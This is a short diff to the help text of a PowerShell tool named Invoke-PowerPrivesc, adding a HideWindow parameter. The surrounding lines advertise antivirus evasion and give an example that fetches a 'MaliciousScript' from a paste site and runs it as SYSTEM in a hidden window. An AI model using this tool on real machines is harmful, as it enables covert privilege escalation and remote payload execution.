@@ -25,6 +25,7 @@ And also,dont even worry of your script is getting caught by AVs,we take care of
 The link that goes into the script
 .PARAMETER ToPrivilege
 The privilege you want,it can be Administrator or SYSTEM
+.PARAMETER HideWindow
 .EXAMPLE
 Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege SYSTEM -HideWindow
 Description
